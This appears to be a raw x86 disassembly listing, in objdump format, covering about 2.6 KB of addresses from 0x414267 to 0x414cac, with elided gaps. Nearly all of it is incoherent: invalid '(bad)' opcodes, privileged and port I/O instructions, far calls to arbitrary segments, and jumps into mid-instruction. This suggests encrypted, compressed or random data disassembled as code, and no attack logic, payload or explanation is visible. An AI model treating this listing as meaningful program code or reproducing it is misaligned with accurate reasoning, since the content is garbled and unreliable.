  414267:	and    ch,BYTE PTR [ebx-0x4a]
  41426a:	jns    0x41429c
  41426c:	ins    BYTE PTR es:[edi],dx
  41426d:	jmp    DWORD PTR [edi-0x70]
  414270:	into   
  414271:	(bad)  [edi+0xbfed11d]
  414277:	sub    al,BYTE PTR [edx]
  414279:	lock scas eax,DWORD PTR es:[edi]
  41427b:	fdivr  DWORD PTR [ebx-0x28]
  41427e:	fcomp  QWORD PTR [ecx+0x6b]
  414281:	fistp  DWORD PTR [esi]
  414283:	xchg   ebp,eax
  414284:	add    DWORD PTR [eax+0x6],0xa7f49764
  41428b:	aad    0x31
  41428d:	nop
  41428e:	mov    cl,0xa4
  414290:	mov    ds:0x77797717,eax
  414295:	dec    esp
  414296:	stos   DWORD PTR es:[edi],eax
  414297:	push   ds
  414298:	mov    ebx,0x39a105be
  41429d:	pop    eax
  41429e:	jle    0x414285
  4142a0:	sbb    eax,0x208f2e1b
  4142a5:	add    DWORD PTR [ecx-0x6bca6b4c],ebp
  4142ab:	rcl    BYTE PTR [ecx-0x44],cl
  4142ae:	dec    edi
  4142af:	mov    esp,0xfde3c9c3
  4142b4:	pop    DWORD PTR [eax]
	...
  414316:	add    DWORD PTR [ecx-0x2122293],eax
  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0xdd190705
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [eax],dl
  41432f:	add    bl,BYTE PTR [eax-0x3a22a376]
  414335:	leave  
  414336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414337:	mov    ds:0x840b7c6b,eax
  41433c:	inc    ecx
  41433d:	xor    eax,0xb8a8495e
  414342:	xor    DWORD PTR [edi-0x1b],0x63178f17
  414349:	popa   
  41434a:	push   eax
  41434b:	and    ah,dh
  41434d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434e:	cdq    
  41434f:	cmc    
  414350:	sub    al,0x48
  414352:	mov    cl,0x3d
  414354:	xor    al,0x9
  414356:	mov    gs,WORD PTR [edx+0x56a8b479]
  41435c:	fsubrp st(1),st
  41435e:	sti    
  41435f:	hlt    
  414360:	cmp    al,0x1a
  414362:	push   esp
  414363:	sub    DWORD PTR [esi-0x78],0x52
  414367:	cmp    esp,DWORD PTR [ecx-0x1160d903]
  41436d:	sub    BYTE PTR [ebp+eiz*4-0x71],ah
  414371:	and    DWORD PTR [ebp+0x40],edi
  414374:	cmp    dl,ch
  414376:	cmp    BYTE PTR [edx+0x57],ch
  414379:	fmul   QWORD PTR [ebx+eiz*4+0x41]
  41437d:	aaa    
  41437e:	jl     0x414335
  414380:	pop    esp
  414381:	ret    
  414382:	sahf   
  414383:	cmp    DWORD PTR ds:0xab65763a,ecx
  414389:	sub    BYTE PTR [edi+0x21],bl
  41438c:	je     0x41439b
  41438e:	add    bl,bl
  414390:	pusha  
  414391:	cmp    ebx,DWORD PTR ds:0xa2f84e87
  414397:	mov    ds:0x2466591f,eax
  41439c:	fcom   DWORD PTR [eax-0x6d]
  41439f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143a0:	mov    ah,0xd2
  4143a2:	test   BYTE PTR [esi+0x1c],ah
  4143a5:	adc    al,0x3a
  4143a7:	jns    0x41440f
  4143a9:	sbb    ch,0x5c
  4143ac:	add    DWORD PTR [esi-0x63abf13a],ebp
  4143b2:	test   ebp,ecx
  4143b4:	out    dx,eax
  4143b5:	xchg   ebx,eax
  4143b6:	xor    eax,0x4c856762
  4143bb:	inc    ebx
  4143bc:	mov    eax,0x618cddbf
  4143c1:	ret    
  4143c2:	ja     0x414393
  4143c4:	ins    BYTE PTR es:[edi],dx
  4143c5:	jg     0x4143ec
  4143c7:	mov    al,0xed
  4143c9:	pop    ebp
  4143ca:	jae    0x41438d
  4143cc:	xor    DWORD PTR [edx+0x4],0xffffffad
  4143d0:	pop    es
  4143d1:	mov    dl,0x5b
  4143d3:	cmp    ecx,edi
  4143d5:	pop    eax
  4143d6:	dec    ebp
  4143d7:	mov    ch,0x99
  4143d9:	mov    bh,0xee
  4143db:	cmc    
  4143dc:	scas   al,BYTE PTR es:[edi]
  4143dd:	sbb    DWORD PTR [esi-0x2a],ecx
  4143e0:	aaa    
  4143e1:	rcl    DWORD PTR [edi],1
  4143e3:	imul   ebp,ebx,0xe79a6d94
  4143e9:	aam    0x1d
  4143eb:	cdq    
  4143ec:	cld    
  4143ed:	mov    dl,0x88
  4143ef:	sbb    al,0x13
  4143f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143f2:	jl     0x414434
  4143f4:	repz loop 0x414466
  4143f7:	sbb    ch,BYTE PTR [edi+0x3d9d6799]
  4143fd:	nop
  4143fe:	xchg   esp,eax
  4143ff:	add    esp,DWORD PTR [ecx-0xf4212bc]
  414405:	sahf   
  414406:	scas   al,BYTE PTR es:[edi]
  414407:	push   0x4f
  414409:	shr    DWORD PTR ds:0xb22944fb,cl
  41440f:	mov    bh,0x21
  414411:	add    eax,0x2b504280
  414416:	sub    esi,DWORD PTR [edi-0x3f]
  414419:	mov    BYTE PTR [edx+0x74111d2a],al
  41441f:	jne    0x41443b
  414421:	xchg   esi,eax
  414422:	adc    ch,bl
  414424:	imul   edx,DWORD PTR [esi+0x7e],0xffffffa4
  414428:	mov    cl,0xdf
  41442a:	std    
  41442b:	pop    ecx
  41442c:	cdq    
  41442d:	and    esp,ecx
  41442f:	cmp    DWORD PTR [eax-0x5c],0xffffff83
  414433:	outs   dx,BYTE PTR ds:[esi]
  414434:	sub    DWORD PTR [eax],eax
	...
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	inc    edx
  4144a3:	xor    esi,DWORD PTR [edx+0x6e]
  4144a6:	or     ebx,edx
  4144a8:	add    BYTE PTR [eax],al
  4144aa:	pop    es
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    BYTE PTR ds:0xe2d1c59e,dh
  4144b3:	push   edx
  4144b4:	jb     0x41446c
  4144b6:	jge    0x414440
  4144b8:	add    esi,DWORD PTR [ecx]
  4144ba:	out    dx,eax
  4144bb:	gs in  eax,dx
  4144bd:	cmp    DWORD PTR [edi+0x69],ecx
  4144c0:	sub    ah,dh
  4144c2:	or     cl,BYTE PTR [ecx-0x6b]
  4144c5:	ret    
  4144c6:	mov    BYTE PTR [edi+0x29fa8bfb],dl
  4144cc:	and    eax,0xf8a6db1c
  4144d1:	test   al,0xb9
  4144d3:	mov    ebp,0x4e6ef975
  4144d8:	inc    ebx
  4144d9:	push   ds
  4144da:	push   edx
  4144db:	dec    eax
  4144dc:	jo     0x4144dd
  4144de:	lods   eax,DWORD PTR ds:[esi]
  4144df:	pop    ebp
  4144e0:	xlat   BYTE PTR ds:[ebx]
  4144e1:	stos   DWORD PTR es:[edi],eax
  4144e2:	icebp  
  4144e3:	xchg   esp,eax
  4144e4:	ds jmp 0x4144ed
  4144e7:	xor    al,0x3
  4144e9:	vandps xmm0,xmm5,XMMWORD PTR [esi+esi*4]
  4144ee:	adc    al,0xf9
  4144f1:	sub    eax,0x10d2e3cb
  4144f6:	lea    ebp,[edx+eax*1+0x54bf6283]
  4144fd:	sbb    al,0xea
  4144ff:	xor    al,0xbe
  414501:	loopne 0x414516
  414503:	stos   BYTE PTR es:[edi],al
  414504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414505:	xchg   ebx,eax
  414506:	push   esi
  414507:	pop    ds
  414508:	pop    esi
  414509:	xor    DWORD PTR [eax+0x74],edx
  41450c:	mov    dl,0xdc
  41450e:	imul   edi,DWORD PTR [ebp+0x2a],0xffffffb0
  414512:	fisttp QWORD PTR [ebp+ebx*2+0x6206a66b]
  414519:	pusha  
  41451a:	and    al,0x29
  41451c:	out    dx,al
  41451d:	xchg   ebp,eax
  41451e:	repz pushf 
  414520:	nop
  414521:	pop    esp
  414522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414523:	sbb    eax,0xeeeec215
  414528:	mov    edx,0x159b5439
  41452d:	out    dx,eax
  41452e:	mov    ah,BYTE PTR [eax+0x2fa37e97]
  414534:	jae    0x4144db
  414536:	xchg   ecx,eax
  414537:	lock push ebp
  414539:	xchg   esp,eax
  41453a:	fnstcw WORD PTR [ebx]
  41453c:	in     eax,0x4e
  41453e:	or     WORD PTR [ecx+edi*8+0xd],cx
  414543:	dec    edi
  414544:	push   ebp
  414545:	push   edi
  414546:	mov    DWORD PTR [ebp+0x11],ebp
  414549:	sbb    DWORD PTR [edi+0x2],edx
  41454c:	sbb    ebp,DWORD PTR [eax+0x43b9d43d]
  414552:	test   DWORD PTR [eax],esi
  414554:	push   esp
  414555:	adc    BYTE PTR [esi+0x48],al
  414558:	jmp    0x56ffc297
  41455d:	idiv   BYTE PTR [esi-0x11]
  414560:	xor    al,0x5c
  414562:	cs and al,0x1a
  414565:	adc    DWORD PTR [ecx+0x4bf1a5f7],ebx
  41456b:	cs jmp 0x23a1:0x83a5254e
  414573:	mov    ecx,0x19142f7
  414578:	loopne 0x41457f
  41457a:	mov    cl,0xb6
  41457c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457d:	(bad)  
  41457f:	jne    0x414574
  414581:	mov    dh,0xed
  414583:	mov    ebx,0xb462df26
  414588:	or     BYTE PTR [ebx-0xd],0x58
  41458c:	xchg   edx,eax
  41458d:	lock pop esp
  41458f:	(bad)  
  414592:	aaa    
  414593:	(bad)  
  414594:	jl     0x4145a2
  414596:	mov    esi,0x59e005cb
  41459b:	add    al,0x4d
  41459d:	aaa    
  41459e:	ins    DWORD PTR es:[edi],dx
  41459f:	or     ebx,esi
  4145a1:	fisubr WORD PTR [ecx+0x7d]
  4145a4:	nop    WORD PTR [ebp+0x1ba83dff]
  4145ac:	enter  0x678a,0x53
  4145b0:	aaa    
  4145b1:	jmp    0x41462c
  4145b3:	call   0x0:0xe4
	...
  414616:	jg     0x414676
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0x80b20dc2
  414624:	pop    ebx
  414625:	xor    al,0x10
  414627:	aam    0x0
  414629:	add    BYTE PTR [edi],al
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR ds:0x4999f74b,dl
  414633:	push   ebp
  414634:	inc    esp
  414635:	xor    edi,DWORD PTR [ebx]
  414637:	push   ds
  414638:	cs (bad) 
  41463a:	sbb    al,0x18
  41463c:	int3   
  41463d:	arpl   cx,cx
  41463f:	push   ss
  414640:	mov    es,WORD PTR ds:0x92eb65e1
  414646:	clc    
  414647:	cs xchg edx,eax
  414649:	add    ah,BYTE PTR [ebx+esi*1-0x2c4889a8]
  414650:	adc    edx,eax
  414652:	cmc    
  414653:	mov    DWORD PTR [esi],0x38e29bfe
  414659:	scas   eax,DWORD PTR es:[edi]
  41465a:	hlt    
  41465b:	xchg   ecx,eax
  41465c:	adc    ecx,0xb6f86072
  414662:	sbb    DWORD PTR [edi-0x7f],0x1a
  414666:	xor    dl,BYTE PTR [edx+eax*8]
  414669:	dec    esi
  41466a:	ret    
  41466b:	hlt    
  41466c:	inc    ebp
  41466d:	push   ds
  41466e:	gs jle 0x4146c9
  414671:	in     eax,0x51
  414673:	out    0xd,eax
  414675:	in     al,dx
  414676:	lds    edi,FWORD PTR [ecx-0x436c231]
  41467c:	jmp    0x41467c
  41467e:	add    DWORD PTR [esi],edi
  414680:	pop    ss
  414681:	aad    0xed
  414683:	pop    eax
  414684:	dec    ebp
  414685:	dec    esi
  414686:	push   ds
  414687:	retf   0x22eb
  41468a:	fwait
  41468b:	mov    DWORD PTR [edx+0x603f66fc],ebp
  414691:	icebp  
  414692:	cmp    bh,BYTE PTR ds:0x29956570
  414698:	xchg   ecx,eax
  414699:	ficomp DWORD PTR [ebx]
  41469b:	adc    BYTE PTR [edx],dl
  41469d:	sbb    ebx,DWORD PTR [ecx]
  41469f:	inc    ebp
  4146a0:	add    DWORD PTR [ebx+ebp*1+0x78],ebp
  4146a4:	xchg   ebx,eax
  4146a5:	or     esi,DWORD PTR [edi]
  4146a7:	(bad)  
  4146a8:	cli    
  4146a9:	in     eax,0xed
  4146ab:	mov    BYTE PTR [edi],bl
  4146ad:	jno    0x41467a
  4146af:	call   0x49219882
  4146b4:	push   ss
  4146b5:	mov    ah,bl
  4146b7:	iret   
  4146b8:	mov    ecx,0x422fe17a
  4146bd:	lahf   
  4146be:	xchg   ebx,eax
  4146bf:	xchg   ecx,eax
  4146c0:	fwait
  4146c1:	dec    edx
  4146c2:	call   0x5644cd46
  4146c7:	mov    ebx,0x1aedc08f
  4146cc:	push   0x77
  4146ce:	ret    
  4146cf:	nop
  4146d0:	ficom  DWORD PTR [esi-0xa]
  4146d3:	jmp    0xda1075ba
  4146d8:	or     eax,0x18be1106
  4146dd:	jle    0x414715
  4146df:	(bad)  [esi-0x22a2a34b]
  4146e5:	ds pop eax
  4146e7:	mov    DWORD PTR [ebx-0x456e5bb3],ecx
  4146ed:	dec    ecx
  4146ee:	mov    ebp,0xded044de
  4146f3:	xchg   ebp,eax
  4146f4:	ds call 0x1b51:0x743ab067
  4146fc:	mov    ebx,0xa99b8ed4
  414701:	addr16 jae 0x4146df
  414704:	mov    ah,0x93
  414706:	mov    ecx,0xf16257e9
  41470b:	adc    al,0x7c
  41470d:	xchg   ebp,eax
  41470e:	imul   esp,DWORD PTR [edx-0x35],0xffffff96
  414712:	mov    al,0xde
  414714:	gs mov eax,0xaa91343a
  41471a:	and    DWORD PTR [esi],0xffffffae
  41471d:	mov    eax,0xe3361d32
  414722:	and    dl,BYTE PTR [ebx-0x256fdfe8]
  414728:	pop    ebp
  414729:	push   ss
  41472a:	jbe    0x4146ae
  41472c:	pop    eax
  41472d:	aas    
  41472e:	pop    edx
  41472f:	pop    ebp
  414730:	mov    dh,0xd6
  414732:	fwait
  414733:	sub    BYTE PTR [ebp+0x0],bh
	...
  414796:	jle    0x4147c7
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	or     eax,0x170a3788
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    ah,dl
  4147af:	in     al,0x3b
  4147b1:	cs inc ebp
  4147b3:	dec    edx
  4147b4:	cmp    eax,ebx
  4147b6:	push   ss
  4147b7:	cmp    ch,bh
  4147b9:	add    BYTE PTR [edi+edx*2-0xb77930e],al
  4147c0:	xlat   BYTE PTR ds:[ebx]
  4147c1:	stos   DWORD PTR es:[edi],eax
  4147c2:	fidiv  DWORD PTR [ebx-0x576a4f8b]
  4147c8:	enter  0x957a,0x44
  4147cc:	pop    edi
  4147cd:	cmp    dl,BYTE PTR [ecx-0xb49c2d0]
  4147d3:	call   0x7f74a7e8
  4147d8:	lahf   
  4147d9:	inc    ecx
  4147da:	ins    DWORD PTR es:[edi],dx
  4147db:	pushaw 
  4147dd:	xchg   ebx,esi
  4147df:	mov    esp,0xebfbfe6b
  4147e4:	sbb    BYTE PTR [ebp-0x36],0xa0
  4147e8:	dec    edx
  4147e9:	hlt    
  4147ea:	mov    DWORD PTR [esi],ecx
  4147ec:	cmp    ch,ah
  4147ee:	cmp    al,0x3
  4147f0:	xchg   esp,eax
  4147f1:	push   ss
  4147f2:	mov    DWORD PTR [ebp-0x32bcc39b],0x3f074586
  4147fc:	shr    ecx,0xa0
  4147ff:	mov    dl,0x35
  414801:	retf   
  414802:	sbb    eax,0x674d8941
  414807:	push   eax
  414808:	jmp    DWORD PTR [ecx]
  41480a:	xor    eax,0xeae2abc8
  41480f:	mov    dh,0xa3
  414811:	test   eax,0xa8d47259
  414816:	out    dx,eax
  414817:	or     al,al
  414819:	or     al,0x1
  41481b:	dec    esi
  41481c:	pop    ebp
  41481d:	inc    ecx
  41481e:	push   es
  41481f:	inc    ebx
  414820:	adc    BYTE PTR [ebp+ebp*1-0x671df9ff],dh
  414827:	jno    0x4147c5
  414829:	mov    edx,0xa55f56c1
  41482e:	push   cs
  41482f:	and    eax,0x645ce9c5
  414834:	push   ebp
  414835:	mul    BYTE PTR [edi+edx*8+0x4a199c0b]
  41483c:	daa    
  41483d:	aas    
  41483e:	mov    ebx,DWORD PTR [ecx+edx*1-0x5bfc33a8]
  414845:	inc    ecx
  414846:	mul    esi
  414848:	ins    DWORD PTR es:[edi],dx
  414849:	not    BYTE PTR [edx]
  41484b:	outs   dx,DWORD PTR ds:[esi]
  41484c:	sub    DWORD PTR [esi-0x2e],0x6d001d5a
  414853:	xchg   edi,eax
  414854:	cmp    BYTE PTR [eax+0x56],al
  414857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414858:	call   0xfd3a:0x260a40a9
  41485f:	mov    esp,0x17944340
  414864:	jmp    0x771be927
  414869:	and    BYTE PTR ds:0xdd561204,cl
  41486f:	pop    eax
  414870:	daa    
  414871:	push   es
  414872:	sub    al,0x3c
  414874:	cli    
  414875:	cmc    
  414876:	mov    al,ds:0xd23a743a
  41487b:	jnp    0x4148da
  41487d:	adc    BYTE PTR [ebx+edi*4],al
  414880:	pusha  
  414881:	mov    edx,0xf6cf3fc
  414886:	cwde   
  414887:	mov    bh,0x5e
  414889:	outs   dx,DWORD PTR ds:[esi]
  41488a:	fwait
  41488b:	(bad)  
  41488c:	cdq    
  41488d:	ror    edi,1
  41488f:	pop    eax
  414890:	and    BYTE PTR [eax+0xde39cc4],dh
  414896:	xlat   BYTE PTR ds:[ebx]
  414897:	retf   0xf353
  41489a:	out    0x60,al
  41489c:	scas   eax,DWORD PTR es:[edi]
  41489d:	clc    
  41489e:	and    BYTE PTR [ecx+0x4a5817b7],0xe6
  4148a5:	push   esp
  4148a6:	mov    dl,0x7
  4148a8:	mov    al,0x36
  4148aa:	ss iret 
  4148ac:	call   0x40bd6ef0
  4148b1:	outs   dx,BYTE PTR ds:[esi]
  4148b2:	dec    edi
  4148b3:	inc    edi
  4148b4:	pop    esp
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x489fc1ed
  414924:	push   edi
  414925:	mov    edi,0xd61e
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [eax+eiz*1+0x8e82e8],cl
  414934:	mov    WORD PTR [ebp+0x22],ds
  414937:	int    0xd7
  414939:	add    dl,BYTE PTR [esi-0x3f]
  41493c:	xchg   esp,eax
  41493d:	xchg   ebp,eax
  41493e:	icebp  
  41493f:	call   0x3ad9:0x8e058937
  414946:	jns    0x4148f7
  414948:	out    0xb4,eax
  41494a:	and    edi,edi
  41494c:	aas    
  41494d:	or     eax,0xb2043993
  414952:	aad    0xa3
  414954:	inc    ebx
  414955:	popf   
  414956:	test   DWORD PTR [bx+si+0x3a],edx
  41495a:	shl    BYTE PTR [esi+0x2042699a],cl
  414960:	and    al,0x53
  414962:	mov    ah,0x5a
  414964:	xchg   esp,eax
  414965:	aad    0x8
  414967:	fsubr  st(7),st
  414969:	test   DWORD PTR [ebp-0x26],ebx
  41496c:	mov    al,ds:0x89a7a5a0
  414971:	jle    0x4149a2
  414973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414974:	and    DWORD PTR [ebx],esp
  414976:	sub    eax,0x8e37da19
  41497b:	les    esi,FWORD PTR [ecx+esi*1-0x7d9a863d]
  414982:	iret   
  414983:	lods   eax,DWORD PTR ds:[esi]
  414984:	das    
  414985:	xchg   cl,ch
  414987:	cmp    edx,DWORD PTR [edx+0x6e2b55f9]
  41498d:	lods   al,BYTE PTR ds:[esi]
  41498e:	and    DWORD PTR [ecx+eiz*4],esi
  414991:	daa    
  414992:	(bad)  
  414993:	gs (bad) 
  414995:	xchg   esi,eax
  414996:	pop    ss
  414997:	cld    
  414998:	in     eax,dx
  414999:	or     edx,ebp
  41499b:	cmp    al,0xcf
  41499d:	mov    bh,0x28
  41499f:	pusha  
  4149a0:	or     BYTE PTR [edx-0x74b0f2ce],dl
  4149a6:	nop
  4149a7:	pop    ss
  4149a8:	jne    0x41499e
  4149aa:	lock outs dx,BYTE PTR fs:[esi]
  4149ad:	adc    dl,BYTE PTR [edi+0x2f]
  4149b0:	sbb    dl,ah
  4149b2:	push   0xf
  4149b4:	add    eax,0x6b52badb
  4149b9:	or     ah,BYTE PTR [eax-0x5]
  4149bc:	xor    eax,0x78c795ec
  4149c1:	gs (bad) 
  4149c3:	push   esp
  4149c4:	push   esp
  4149c5:	inc    eax
  4149c6:	daa    
  4149c7:	add    BYTE PTR [edx+0x1aab28e2],ah
  4149cd:	mov    al,ds:0x9720f66a
  4149d2:	inc    edi
  4149d3:	fnstsw WORD PTR [edi+0xe]
  4149d6:	mov    cl,0x82
  4149d8:	shr    BYTE PTR [ebx-0x67],0x37
  4149dc:	retf   
  4149dd:	mov    ebp,0x157afacb
  4149e2:	outs   dx,DWORD PTR ds:[esi]
  4149e3:	imul   ebp,DWORD PTR [esi+0x60],0xffffffc2
  4149e7:	arpl   WORD PTR [ecx-0x4a],ax
  4149ea:	ror    DWORD PTR [edx+0x7b39217b],cl
  4149f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149f2:	add    DWORD PTR [ebx],ebp
  4149f4:	data16 cmp BYTE PTR [esi+eiz*2-0x4e4ac446],cl
  4149fc:	mov    eax,DWORD PTR [ebp+0x5b]
  4149ff:	inc    edx
  414a00:	fisub  WORD PTR [ebx+eax*8]
  414a03:	jno    0x414a6b
  414a05:	into   
  414a06:	jecxz  0x414a09
  414a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a09:	mov    ebp,0x83ddbd7
  414a0e:	or     al,0x2f
  414a10:	xchg   ebx,eax
  414a11:	sub    ah,BYTE PTR [bx+si-0x66]
  414a15:	jl     0x4149f7
  414a17:	iret   
  414a18:	and    eax,0xbfeb1106
  414a1d:	jmp    0x17fd5b96
  414a22:	add    edi,esp
  414a24:	push   di
  414a26:	cld    
  414a27:	inc    edx
  414a28:	lea    ebx,[ecx]
  414a2a:	push   ebx
  414a2b:	push   ebp
  414a2c:	ins    BYTE PTR es:[edi],dx
  414a2d:	sub    DWORD PTR [ecx+0x767cccf9],eax
  414a33:	and    ebx,DWORD PTR [eax+eax*1]
	...
  414a96:	lahf   
  414a97:	fnstcw WORD PTR [esi]
  414a99:	ss jle 0x414a93
  414a9c:	lahf   
  414a9d:	stc    
  414a9e:	and    al,0x64
  414aa0:	mov    dl,0x1b
  414aa2:	pop    edi
  414aa3:	fsub   QWORD PTR [edx]
  414aa5:	dec    eax
  414aa6:	and    eax,0x70000d7
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [edx],dl
  414aaf:	enter  0x14d5,0x42
  414ab3:	dec    esp
  414ab4:	pop    edx
  414ab5:	pop    ebx
  414ab6:	mov    BYTE PTR [ebx+0x33],dl
  414ab9:	jl     0x414b2d
  414abb:	push   edi
  414abc:	loop   0x414aa6
  414abe:	mov    bh,0xb0
  414ac0:	and    eax,0x57f56847
  414ac5:	jb     0x414b39
  414ac7:	push   edx
  414ac8:	cmc    
  414ac9:	das    
  414aca:	or     esp,0x5b6402c5
  414ad0:	inc    ebp
  414ad1:	pop    esp
  414ad2:	imul   eax,DWORD PTR [edx+0x35]
  414ad6:	mov    ebp,0xfd47cd77
  414adb:	and    ecx,esi
  414add:	lahf   
  414ade:	dec    edi
  414adf:	sub    al,0xc2
  414ae1:	cmc    
  414ae2:	icebp  
  414ae3:	jns    0x414a7f
  414ae5:	call   0xa7ab4732
  414aea:	mov    BYTE PTR [eax+0x254efd3b],0xbb
  414af1:	repnz sub edx,DWORD PTR [edx-0x771d76ec]
  414af8:	lea    edi,[edx+0x401d1899]
  414afe:	sbb    al,0x8c
  414b00:	or     al,0xe5
  414b02:	cmp    DWORD PTR [esi+0x66f921f1],esp
  414b08:	pusha  
  414b09:	adc    eax,0xbba7d467
  414b0e:	inc    ecx
  414b0f:	dec    esi
  414b10:	into   
  414b11:	call   0xc4ce:0x1cd14520
  414b18:	jbe    0x414b71
  414b1a:	imul   bl
  414b1c:	in     al,dx
  414b1d:	and    BYTE PTR ds:0x7b3ffa11,ah
  414b23:	outs   dx,DWORD PTR ds:[esi]
  414b24:	mov    DWORD PTR [ecx+0xb],eax
  414b27:	jmp    0x414b22
  414b29:	sub    ebp,DWORD PTR [edi-0x27]
  414b2c:	loop   0x414b23
  414b2e:	movsx  edx,WORD PTR [eax+0x6c]
  414b32:	bound  ecx,QWORD PTR [edx]
  414b34:	dec    esp
  414b35:	lahf   
  414b36:	add    edx,DWORD PTR [ebx]
  414b38:	sbb    cl,bh
  414b3a:	push   eax
  414b3b:	pop    ds
  414b3c:	retf   0x2afc
  414b3f:	ja     0x414b86
  414b41:	sahf   
  414b42:	mov    esp,0x6695daa5
  414b47:	mov    dh,0xf7
  414b49:	retf   
  414b4a:	ja     0x414b1c
  414b4c:	xchg   ebx,eax
  414b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b4e:	dec    ecx
  414b4f:	and    al,dh
  414b51:	ror    BYTE PTR [edx+0x37],1
  414b54:	je     0x414bb6
  414b56:	sub    eax,0xe3bb3dfd
  414b5b:	pop    ds
  414b5c:	mov    al,0xef
  414b5e:	pop    es
  414b5f:	aam    0x8
  414b61:	mov    eax,0x2fac191
  414b66:	push   ss
  414b67:	(bad)  
  414b68:	jnp    0x414b2d
  414b6a:	enter  0x93ed,0xb
  414b6e:	std    
  414b6f:	sar    DWORD PTR [ecx+edx*4+0x44783ca6],1
  414b76:	xchg   DWORD PTR [ebx],edx
  414b78:	call   0x4c1e:0x293ecae3
  414b7f:	mov    ds,WORD PTR [ecx-0x364364b5]
  414b85:	push   ebx
  414b86:	fiadd  WORD PTR [edi-0x5a]
  414b89:	mov    al,0xf2
  414b8b:	or     eax,0x1ad312c4
  414b90:	and    esp,eax
  414b92:	sub    al,0xd9
  414b94:	(bad)  [edx+eax*2]
  414b97:	push   eax
  414b98:	pop    ebx
  414b99:	(bad)  [ecx]
  414b9b:	out    0x76,eax
  414b9d:	xchg   BYTE PTR [edx-0x67],bl
  414ba0:	aad    0x29
  414ba2:	pop    es
  414ba3:	jns    0x414bbe
  414ba5:	ror    esi,0xd
  414ba8:	cmp    al,0x2d
  414baa:	imul   DWORD PTR [ebx]
  414bac:	or     eax,eax
  414bae:	out    0x34,eax
  414bb0:	xchg   ecx,eax
  414bb1:	push   esi
  414bb2:	fidiv  DWORD PTR [edi+ebp*1+0x0]
	...
  414c15:	add    BYTE PTR [esp+eiz*2],dh
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	and    DWORD PTR [ecx-0x27d3b23a],edx
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [esi-0x666b58a9],al
  414c33:	xor    DWORD PTR ds:0xed76e4d7,eax
  414c39:	test   DWORD PTR [esi+0x54],ebx
  414c3c:	dec    ebp
  414c3d:	or     al,0x56
  414c3f:	lea    eax,[edx+0x2f]
  414c42:	sub    bl,BYTE PTR [eax+0x6f]
  414c45:	lahf   
  414c46:	std    
  414c47:	lods   al,BYTE PTR ds:[esi]
  414c48:	retf   0x356d
  414c4b:	xchg   ebx,eax
  414c4c:	clts   
  414c4e:	sti    
  414c4f:	je     0x414caf
  414c51:	ret    
  414c52:	inc    ebp
  414c53:	(bad)  
  414c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c55:	mov    eax,ds:0x4fcc1d10
  414c5a:	ds xor al,0x37
  414c5d:	sub    al,0xab
  414c5f:	inc    edx
  414c60:	icebp  
  414c61:	cmp    eax,0x15e97d11
  414c66:	and    al,cl
  414c68:	pop    esi
  414c69:	test   BYTE PTR [ebp-0x38c7a7d7],cl
  414c6f:	xlat   BYTE PTR ds:[ebx]
  414c70:	in     al,dx
  414c71:	push   ecx
  414c72:	cli    
  414c73:	mov    ?,WORD PTR [eax+esi*8]
  414c76:	jmp    0x414c56
  414c78:	loop   0x414c9a
  414c7a:	and    ebx,esi
  414c7c:	jle    0x414c3f
  414c7e:	push   esi
  414c7f:	lock push ebp
  414c81:	push   ebx
  414c82:	shl    DWORD PTR ds:[edi+0x2a2fb28f],cl
  414c89:	push   cs
  414c8a:	rcr    BYTE PTR [esp+edx*1],0x8b
  414c8e:	lds    edi,FWORD PTR [edx]
  414c90:	inc    edx
  414c91:	retf   
  414c92:	dec    esi
  414c93:	mov    edx,0xc9beb43e
  414c98:	fisub  WORD PTR [ecx-0x7000889a]
  414c9e:	iret   
  414c9f:	xchg   BYTE PTR [eax+0x50e12a5b],cl
  414ca5:	jnp    0x414ca5
  414ca7:	ja     0x414c82
  414ca9:	push   ebp
  414caa:	xlat   BYTE PTR ds:[ebx]
  414cab:	leave  
  414cac:	cmp    cl,BYTE PTR [eax+edx*4+0x7]
